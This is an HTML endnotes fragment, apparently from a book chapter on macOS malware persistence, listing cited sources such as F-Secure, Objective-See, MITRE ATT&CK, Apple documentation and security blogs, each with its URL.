<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-11" id="-endnote-11">	11</a></sup>	<span epub:type="pagebreak" id="Page_46" title="46"/>“Trojan-Downloader:OSX/Flashback.B,” F-Secure, <a class="LinkURL" href="https://www.f-secure.com/v-descs/trojan-downloader_osx_flashback_b.shtml">https://www.f-secure.com/v-descs/trojan-downloader_osx_flashback_b.shtml</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-12" id="-endnote-12">	12</a></sup>	“Hardened Runtime,” Apple Developer Documentation, <a class="LinkURL" href="https://developer.apple.com/documentation/security/hardened_runtime/">https://developer.apple.com/documentation/security/hardened_runtime/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-13" id="-endnote-13">	13</a></sup>	“Dylib hijacking on OS X,” Virus Bulletin, March 2015, <a class="LinkURL" href="https://www.virusbulletin.com/uploads/pdf/magazine/2015/vb201503-dylib-hijacking.pdf">https://www.virusbulletin.com/uploads/pdf/magazine/2015/vb201503-dylib-hijacking.pdf</a>; “MacOS Dylib Injection through Mach-O Binary Manipulation,” Malware Unicorn, <a class="LinkURL" href="https://malwareunicorn.org/workshops/macos_dylib_injection.html">https://malwareunicorn.org/workshops/macos_dylib_injection.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-14" id="-endnote-14">	14</a></sup>	Create [dylib] Hijacker, EmPyre, last commit on May 21, 2016, <a class="LinkURL" href="https://github.com/EmpireProject/EmPyre/blob/master/lib/modules/persistence/osx/CreateHijacker.py/">https://github.com/EmpireProject/EmPyre/blob/master/lib/modules/persistence/osx/CreateHijacker.py/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-15" id="-endnote-15">	15</a></sup>	“Inside Safari Extensions: Malware’s Golden Key to User Data,” SentinelOne blog, October 18, 2018, <a class="LinkURL" href="https://www.sentinelone.com/blog/inside-safari-extensions-malware-golden-key-user-data/">https://www.sentinelone.com/blog/inside-safari-extensions-malware-golden-key-user-data/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-16" id="-endnote-16">	16</a></sup>	“Arm’d &amp; Dangerous,” <em>Objective-See</em>, February 14, 2021, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x62.html">https://objective-see.com/blog/blog_0x62.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-17" id="-endnote-17">17</a></sup>	 “iTunes Evil Plugin Proof of Concept,” Reverse Engineering blog, February 15, 2014, <a class="LinkURL" href="https://reverse.put.as/2014/02/15/appledoesntgiveafuckaboutsecurity-itunes-evil-plugin-proof-of-concept/">https://reverse.put.as/2014/02/15/appledoesntgiveafuckaboutsecurity-itunes-evil-plugin-proof-of-concept/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-18" id="-endnote-18">18</a></sup>	“macOS persistence - Spotlight importers and how to create them,” Theevilbit blog, November 4, 2019, <a class="LinkURL" href="https://theevilbit.github.io/posts/macos_persistence_spotlight_importers/">https://theevilbit.github.io/posts/macos_persistence_spotlight_importers/</a>; Patrick Wardle, “Writing Bad @$$ Malware for OS X,” <a class="LinkURL" href="https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf">https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf</a>; “Two macOS persistence tricks abusing plugins,” CodeColorist, November 21, 2019, <a class="LinkURL" href="https://blog.chichou.me/2019/11/21/two-macos-persistence-tricks-abusing-plugins/">https://blog.chichou.me/2019/11/21/two-macos-persistence-tricks-abusing-plugins/</a>; “Using Authorization Plug-ins,” Apple Developer documentation, <a class="LinkURL" href="https://developer.apple.com/documentation/security/authorization_plug-ins/using_authorization_plug-ins/">https://developer.apple.com/documentation/security/authorization_plug-ins/using_authorization_plug-ins/</a>; “Beyond the good ol’ LaunchAgents - 5 - Pluggable Authentication Modules (PAM),” Theevilbit blog, March 20, 2021, <a class="LinkURL" href="https://theevilbit.github.io/beyond/beyond_0005/">https://theevilbit.github.io/beyond/beyond_0005/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-19" id="-endnote-19">	19</a></sup>	“Event Triggered Execution: Unix Shell Configuration Modification,” MITRE ATT&amp;CK, last modified August 20, 2021 since this book’s publication, <a class="LinkURL" href="https://attack.mitre.org/techniques/T1546/004/">https://attack.mitre.org/techniques/T1546/004/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-20" id="-endnote-20">	20</a></sup>	<em>*OS Internals</em>, Volume I: <em>User Mode</em>, (October 2017), <a class="LinkURL" href="http://newosxbook.com/index.php">http://newosxbook.com/index.php</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-21" id="-endnote-21">	21</a></sup>	“Mac adware is more sophisticated and dangerous than traditional Mac malware,” Malwarebytes Labs blog, February 27, 2020, <a class="LinkURL" href="https://blog.malwarebytes.com/mac/2020/02/mac-adware-is-more-sophisticated-dangerous-than-traditional-mac-malware/">https://blog.malwarebytes.com/mac/2020/02/mac-adware-is-more-sophisticated-dangerous-than-traditional-mac-malware/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><sup class="endnote"><a href="#-noteref-22" id="-endnote-22">	22</a></sup>	“KnockKnock,” <em>Objective-See</em>, <a class="LinkURL" href="https://objective-see.com/products/knockknock.html">https://objective-see.com/products/knockknock.html</a>.</p></aside>
</section>
</body>
</html>